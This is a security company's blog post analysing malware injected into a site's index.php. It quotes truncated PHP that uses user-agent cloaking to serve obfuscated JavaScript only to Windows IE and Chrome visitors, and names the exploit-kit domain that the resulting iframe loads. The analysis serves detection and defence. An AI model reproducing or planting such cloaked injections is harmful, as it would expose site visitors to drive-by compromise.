Ask Sucuri: Why Do I Only Get Malware Warnings on Certain Browsers?

A few days ago, our scanner alerted that a site had malware related to the Blackhole Exploit Kit. The owner of the site said that when he visited the site, nothing happened, and the malware wasnâ€™t displayed â€“ probably thinking it was a false positive.
After a bit of manual testing, we noted that the malware was only being displayed to certain browsers (IE and Chrome on Windows), and not on the others.
Once we got access to the site, we learned why. It had the following code on the index.php file:

error_reporting(0);
$botÂ =Â FALSEÂ ;
$uaÂ =Â $_SERVER[â€˜HTTP_USER_AGENTâ€™];
$botsUAÂ =Â array(â€˜12345â€²,â€™alexa&#46comâ€™,â€™anonymouse&#46orgâ€™,â€™bdbrandprotect&#46comâ€™,
â€˜blogpulse&#46comâ€™,â€™botâ€™,â€™buzztracker&#46comâ€™,â€™crawlâ€™,â€™docomoâ€™,â€™drupal&#46orgâ€™,
â€˜httpclientâ€™,â€™internetseer&#46comâ€™,â€™linuxâ€™,â€™macintoshâ€™,â€™macÂ osâ€™,â€™magentâ€™,â€™mailruâ€™,
â€˜netcraftâ€™,â€™openacoon&#46deâ€™,â€™operaÂ miniâ€™,â€™operaÂ mobiâ€™,â€™playstationâ€™,
â€˜rssreaderâ€™,â€™slurpâ€™,â€™snoopyâ€™,â€™spiderâ€™,â€™spyderâ€™
,â€™validatorâ€™,â€™virusâ€™,â€™vlcÂ mediaÂ playerâ€™,â€™webcollageâ€™,â€™wordpressâ€™,â€™x11â€²,
â€˜iphoneâ€™,â€™androidâ€™, â€˜firefoxâ€™);
foreachÂ ($botsUAÂ asÂ $bs)Â {if(strpos(strtolower($ua),Â $bs)!==Â false){$botÂ =Â true;Â break;}}
ifÂ (!$bot){
echo(base64_decode("PHNjcmlwdD5pZih3aW5kb3cuZG9jdW1lbnQpYT0icmYzIi5zcGxâ€¦

Do you know what it does? It checks the user agent (aka browser) of the person visiting the site and only displays the malware if it does not contain the strings â€œLinuxâ€,  â€œMacâ€, â€œIphoneâ€, â€œFirefoxâ€, â€œBotâ€, â€œVirusâ€, etcâ€¦
So if you are on a Mac, or Linux, or using Firefox, nothing would happen. However, when you go to the site using Windows and IE or Chrome, it would attempt to compromise your browser/computer.
This makes much harder for the owner of the site to detect the malware and take action to remove it. Thatâ€™s why on our malware scanner, we use multiple Browsers, referrers, and user agents to try to catch any hidden malicious code. So just because you canâ€™t see it, doesnâ€™t mean it is not there ğŸ™‚
Technical details
If you are curious about what that code above does after being decoded, it prints the following JavaScript to the bottom of the site:

<script>if(window.document)a="rf3".split("5236").pop+â€™qweâ€™;a=a[â€œspliâ€+â€tâ€](â€œâ€).reverse()[â€œpoâ€+â€pâ€]();if(a==â€™fâ€™||a==â€nâ€)
f=[5,5,101,98,28,36,96,107,95,113,105,97,106,112,42,99,97,112,65,104,97,105,97,
106,112,111,62,117,80,93,99,74,93,105,97,36,35,94,107,96,117,35,37,87,44,89,37,
119,5,5,5,101,98,110..

When this script read by the browser, it will create an iFrame to http://vvesek.freetcp.com/i/i.php?go=1 (and variations â€“ these domains change often), where the actual Blackhole Exploit Kit code will come from.
Conclusion
This is just an example why sometimes users complain of malware when visiting a site, but the owner doesnâ€™t see it. This may also lead to Sucuri scanner alerts and the owner canâ€™t find the issue. If you have any questions, let us know.

Is your site hacked? Blacklisted? We are here to help.
